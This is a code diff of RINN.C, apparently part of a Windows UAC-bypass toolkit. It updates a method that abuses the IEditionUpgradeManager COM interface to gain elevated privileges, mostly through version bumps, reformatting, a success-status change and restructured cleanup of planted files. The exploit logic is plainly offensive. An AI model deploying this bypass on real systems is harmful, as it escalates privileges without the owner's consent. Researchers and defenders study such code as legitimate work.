@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2018 - 2023
+*  (C) COPYRIGHT AUTHORS, 2018 - 2025
 *
 *  TITLE:       RINN.C
 *
-*  VERSION:     3.65
+*  VERSION:     3.69
 *
-*  DATE:        25 Sep 2023
+*  DATE:        07 Jul 2025
 *
 *  FBK UAC bypass methods.
 *
@@ -39,10 +39,10 @@ NTSTATUS ucmEditionUpgradeManagerMethod(
     _In_ DWORD ProxyDllSize
 )
 {
-    NTSTATUS                    MethodResult = STATUS_ACCESS_DENIED;
-    BOOL                        bEnvSet = FALSE;
-    HRESULT                     hr_init;
-    IEditionUpgradeManager     *Manager = NULL;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    BOOL bEnvSet = FALSE;
+    HRESULT hr_init;
+    IEditionUpgradeManager *Manager = NULL;
 
     DWORD Data[3];
 
@@ -133,8 +133,10 @@ NTSTATUS ucmEditionUpgradeManagerMethod(
             Data[1] = 'f';
             Data[2] = 0;
 
-            Manager->lpVtbl->AcquireModernLicenseWithPreviousId(Manager, MYSTERIOUSCUTETHING, (PDWORD)&Data);
+            Manager->lpVtbl->AcquireModernLicenseWithPreviousId(Manager,
+                MYSTERIOUSCUTETHING, (PDWORD)&Data);
 
+            MethodResult = STATUS_SUCCESS;
         }
 
     } while (FALSE);
@@ -156,16 +158,17 @@ NTSTATUS ucmEditionUpgradeManagerMethod(
 
     supWaitForGlobalCompletionEvent();
 
-    if (lpPath && stringPtr) {
+    if (lpPath) {
+        if (stringPtr) {
+            DeleteFile(lpPath);
 
-        DeleteFile(lpPath);
+            *stringPtr = 0;
+            _strcat(lpPath, SYSTEM32_DIR);
+            RemoveDirectory(lpPath);
 
-        *stringPtr = 0;
-        _strcat(lpPath, SYSTEM32_DIR);
-        RemoveDirectory(lpPath);
-
-        *stringPtr = 0;
-        RemoveDirectory(lpPath);
+            *stringPtr = 0;
+            RemoveDirectory(lpPath);
+        }
 
         supHeapFree(lpPath);
     }
